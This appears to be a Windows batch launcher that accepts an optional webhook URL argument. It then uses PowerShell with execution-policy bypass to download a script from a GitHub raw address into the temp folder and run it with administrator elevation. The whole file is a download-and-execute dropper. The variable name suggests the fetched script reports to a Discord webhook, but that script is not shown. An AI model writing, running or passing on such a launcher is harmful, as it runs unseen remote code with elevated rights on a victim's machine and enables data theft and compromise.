@echo off
if not "%1"=="" set "DCWH_URL=%1"
powershell -NoP -EP Bypass -C "iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/s.ps1' -OutFile '%TEMP%\s.ps1';Start-Process powershell '-NoP -EP Bypass -File \"%TEMP%\s.ps1\"' -Verb RunAs"